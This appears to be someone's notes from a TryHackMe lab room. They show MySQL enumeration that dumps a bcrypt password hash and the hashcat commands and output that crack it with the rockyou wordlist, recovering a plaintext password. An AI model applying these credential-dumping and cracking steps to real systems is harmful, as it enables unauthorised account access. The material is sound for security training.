<code>
https://tryhackme.com/room/ettubrute

## mysql Enumeration


MySQL [mysql]> use website;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [website]> select * from user;
ERROR 1146 (42S02): Table 'website.user' doesn't exist
MySQL [website]> select * from userss;
ERROR 1146 (42S02): Table 'website.userss' doesn't exist
MySQL [website]> select * from userss
    -> select * from userss;
ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'select * from userss' at line 2
MySQL [website]> select * from users;
+----+----------+--------------------------------------------------------------+---------------------+
| id | username | password                                                     | created_at          |
+----+----------+--------------------------------------------------------------+---------------------+
|  1 | Adrian   | $2y$10$tLzQuuQ.h6zBuX8dV83zmu9pFlGt3EF9gQO4aJ8KdnSYxz0SKn4we | 2021-10-20 02:43:42 |
+----+----------+--------------------------------------------------------------+---------------------+
1 row in set (0.033 sec)

MySQL [website]> 


──(kali㉿kali)-[~/Documents/THM/THM_Brute]
└─$ cat hash.txt 
$A$005$n:{T^3%/{5=+Z0Y1zOxlUB7mIrlVbAxA5t4ARcqMaY6i4k1AhaU2/W1

## Adrian Hash creaking                                                                                                                                        

┌──(kali㉿kali)-[~/Documents/THM/THM_Brute]
└─$ hashcat hash.txt -m 3200 ../../../Documents/www/wordlists/rockyou.txt
hashcat (v6.2.6) starting
Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 72
Dictionary cache built:
* Filename..: ../../../Documents/www/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

$2y$10$tLzQuuQ.h6zBuX8dV83zmu9pFlGt3EF9gQO4aJ8KdnSYxz0SKn4we:tigger
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2y$10$tLzQuuQ.h6zBuX8dV83zmu9pFlGt3EF9gQO4aJ8KdnSY...SKn4we
Time.Started.....: Tue May 20 12:35:32 2025 (1 sec)
Time.Estimated...: Tue May 20 12:35:33 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (../../../Documents/www/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:       40 H/s (3.68ms) @ Accel:4 Loops:16 Thr:1 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 32/14344385 (0.00%)
Rejected.........: 0/32 (0.00%)
Restore.Point....: 16/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:1008-1024
Candidate.Engine.: Device Generator
Candidates.#1....: 654321 -> butterfly

Started: Tue May 20 12:34:47 2025
Stopped: Tue May 20 12:35:34 2025

